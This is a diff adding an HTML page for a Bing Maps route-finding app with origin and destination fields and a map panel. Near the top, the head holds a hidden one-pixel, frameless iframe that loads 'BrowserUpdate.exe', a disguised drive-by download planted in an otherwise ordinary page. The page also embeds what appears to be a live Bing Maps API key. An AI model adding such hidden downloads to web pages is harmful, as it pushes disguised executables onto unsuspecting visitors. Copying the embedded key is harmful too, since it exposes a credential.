@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
+    <title></title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <script type='text/javascript' src=map.js></script>
+        <style>
+        html, body{
+            padding:0;
+            margin:1;
+            height:100vh;
+            overflow: visible;
+        }
+      
+
+        .directionsContainer{
+            width:20%;
+            height:100%;
+            overflow-y:auto;
+            float:left;
+        }
+        .center{ text-align:center;}
+        
+    
+
+
+        #myMap{
+            position:relative;
+            overflow-y:auto;
+            width:79%;
+            height:100%;
+            float:right;
+        }
+
+        .button {
+          padding: 0 40px 0 40px;
+	line-height: 31px;
+	color: #14171c !important;
+	background-color: #fcaf3b;
+	font-weight: bolder;
+	border-radius: 24px;
+	display: inline-block;
+
+
+        }
+
+        
+
+
+
+
+    </style>
+    <script type='text/javascript' src='https://www.bing.com/api/maps/mapcontrol?callback=GetMap&key=AgLPHZF3b-Hs-KyO47aPaXErLWqTmrf0OQLABfe_qI6YLcrMsGsnYK9ahvseHOTz' async defer></script>
+</head>
+<body>
+
+
+<div id="myMap"></div>
+
+
+<div class="directionsContainer">
+    <div class="center">
+        
+<div  id='origineTbxd'><input type="text" maxlength="1000" id="origineTbx" title="From" data-tag="watermarkInput" placeholder="From" autocorrect="off" autocapitalize="off" style="background-color: transparent;width: 75%;border-radius: 20px;outline: none; border: 2px solid #14171c;padding: 15px;height: 15px;" data-bm="36"></div>
+<br></br>
+<div  id='detinationTbxd'><input type="text" maxlength="1000" id="detinationTbx" title="To" data-tag="watermarkInput" placeholder="To" autocorrect="off" autocapitalize="off" style="background-color: transparent;width:75%;border-radius: 20px;border: 2px solid #14171c;outline: none;padding: 15px;height: 15px;" data-bm="36"></div>
+<br></br> 
+<input class=button type="button" value="GO" onclick="Search()" />
+<input class=button type="button" value="Clear" onclick="stopTracking()" />
+<br></br>
+    <div id='routeInfoPanel'></div> 
+  
+ </div>
+    <div id='carinfo'></div> 
+ <div  id="myDynamicTable"></div>  
+ <div  id="info"></div>
+ <div id='printoutPanel'></div>
+
+</div>
+
+  
+
+
+    <!-- <div id="myMap"></div> -->
+</body>
+</html>
